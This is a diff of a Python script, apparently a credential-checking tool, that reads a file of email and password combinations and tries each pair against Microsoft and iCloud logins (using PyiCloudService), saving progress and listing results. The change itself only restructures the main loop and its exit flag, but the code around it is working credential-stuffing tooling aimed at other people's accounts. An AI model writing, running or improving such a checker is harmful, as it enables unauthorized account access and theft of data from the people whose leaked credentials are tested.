@@ -82,11 +82,11 @@ def checkLoginMS(email, contra):
 
 def checkLoginiCloud(email,contra):
     try:
-        icloud = PyiCloudService(email,contra)
+        PyiCloudService(email,contra)
         return True
     except:
         return False
-
+        
 salida = False
 
 def salir(signum, frame):
@@ -113,7 +113,6 @@ if __name__ == "__main__":
         if lineaSav == "":
             flag = True
         sav.close()
-
     else:
         open(save, "w")
     fil = open(inputTXT, "r")
@@ -124,29 +123,26 @@ if __name__ == "__main__":
     lineasActuales = 0
     num = [0]
     for linea in lineas:
-        
+        if salida == False:
             try:
-                if salida == False:
-                    if flag and linea != "":
-                        lineaRaw = linea
-                        linea = linea.split(',')
-                        email = linea[0]
-                        contras = linea[1:]
-                        if len(contras) > 1:
-                            if linea[1] not in linea[2:]:
-                                for contra in contras:
-                                    checklogin(email, contra, datos, num)
-                            else:
-                                contra = linea[1]
+                if flag and linea != "":
+                    lineaRaw = linea
+                    linea = linea.split(',')
+                    email = linea[0]
+                    contras = linea[1:]
+                    if len(contras) > 1:
+                        if linea[1] not in linea[2:]:
+                            for contra in contras:
                                 checklogin(email, contra, datos, num)
                         else:
                             contra = linea[1]
                             checklogin(email, contra, datos, num)
-                        sav = open(save, "w")
-                        sav.write(lineaRaw)
-                        sav.close()
-                else:
-                    break
+                    else:
+                        contra = linea[1]
+                        checklogin(email, contra, datos, num)
+                    sav = open(save, "w")
+                    sav.write(lineaRaw)
+                    sav.close()
                 if linea == lineaSav and linea != "":
                     flag = True
             except Exception as e:
@@ -154,6 +150,6 @@ if __name__ == "__main__":
             finally:
                 lineasActuales += 1
                 print("%{0}".format(float((100/numLineas)*lineasActuales)))
-        
-
+        else:
+            break
     eliminarRepetidos(outputTXT)
